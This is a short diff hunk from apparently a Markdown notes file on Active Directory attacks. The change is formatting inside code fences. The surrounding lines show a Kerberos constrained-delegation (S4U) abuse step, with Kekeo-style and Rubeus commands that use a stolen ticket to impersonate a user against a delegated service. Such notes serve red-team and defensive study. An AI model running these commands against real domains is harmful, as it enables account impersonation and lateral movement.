@@ -705,9 +705,9 @@ Request TGT:
 
 Using S4U and the previous TGT, request a TGS:
 
-```tgs::s4u /tgt:CERT_WE_STOLE.kirbi
+``` tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 /user:user_we_are_impersonating@ecorp.lab
-/service:ServiceListedIn{msDS-AllowedToDelegateTo}```
+/service:ServiceListedIn{msDS-AllowedToDelegateTo} ```
 
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
